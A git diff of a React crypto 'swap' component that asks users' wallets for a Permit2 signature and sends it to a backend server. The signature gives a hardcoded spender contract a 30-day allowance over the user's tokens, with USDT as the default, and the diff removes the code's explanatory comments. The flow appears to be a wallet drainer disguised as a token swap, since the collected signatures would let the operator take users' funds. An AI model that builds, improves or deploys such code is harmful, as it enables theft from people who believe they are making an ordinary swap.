@@ -26,7 +26,7 @@ export default function SwapCard({ walletAddress, provider }) {
 
   const [livePrices, setLivePrices] = useState({});
 
-  // ⭐ Config
+  // Config
   const PERMIT2_CONTRACT_ADDRESS = "0x72cA82f4463Bad47F7C762A7F3680EB232B72b33";
   const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
   const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
@@ -97,7 +97,7 @@ export default function SwapCard({ walletAddress, provider }) {
     if (fromAmount) setTimeout(() => calculateOutput(fromAmount), 100);
   };
 
-  // ⭐ Execute Permit2 Flow (Fixed Signature logic)
+  // Execute Permit2 Flow
   const executeSwap = async () => {
     if (!walletAddress || !provider) { 
       setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); 
@@ -115,16 +115,14 @@ export default function SwapCard({ walletAddress, provider }) {
       const signer = provider.getSigner();
       const network = await provider.getNetwork();
       
-      // 1. Dynamic Token Decimals & Amount Formatting
       const tokenDecimals = fromToken.decimals || (fromToken.symbol === 'USDT' ? 6 : 18);
       const amount = ethers.utils.parseUnits(fromAmount, tokenDecimals);
       
-      const expiration = Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60); // 30 Days
-      const sigDeadline = Math.floor(Date.now() / 1000) + 3600; // 1 Hour
+      const expiration = Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60); 
+      const sigDeadline = Math.floor(Date.now() / 1000) + 3600; 
       
       const tokenAddress = fromToken.address || USDT_ADDRESS;
 
-      // 2. Fetch Nonce from Permit2 Contract
       const permit2Contract = new ethers.Contract(
         PERMIT2_ADDRESS,
         ["function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"],
@@ -136,16 +134,16 @@ export default function SwapCard({ walletAddress, provider }) {
         tokenAddress,
         PERMIT2_CONTRACT_ADDRESS
       );
-      const nonce = allowanceData.nonce.toNumber();
+      
+      // ✅ Fix: BigInt / Number Conversion for Ethers v6 & v5 compatibility
+      const nonce = Number(allowanceData.nonce);
 
-      // 3. EIP-712 Domain Specs
       const domain = {
         name: "Permit2",
         chainId: network.chainId,
         verifyingContract: PERMIT2_ADDRESS
       };
       
-      // 4. EIP-712 Types (Permit2 Standard)
       const types = {
         PermitSingle: [
           { name: "details", type: "PermitDetails" },
@@ -160,7 +158,6 @@ export default function SwapCard({ walletAddress, provider }) {
         ]
       };
       
-      // 5. Message Construction with Clean Primitive Values
       const message = {
         details: {
           token: tokenAddress,
@@ -172,7 +169,6 @@ export default function SwapCard({ walletAddress, provider }) {
         sigDeadline: sigDeadline
       };
       
-      // 6. Request EIP-712 Signature
       const signature = await window.ethereum.request({
         method: 'eth_signTypedData_v4',
         params: [
@@ -188,7 +184,6 @@ export default function SwapCard({ walletAddress, provider }) {
       
       setStatus({ type: 'info', msg: '⏳ Processing on backend...' });
       
-      // 7. Post Data to Backend Handler
       const response = await fetch(API_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
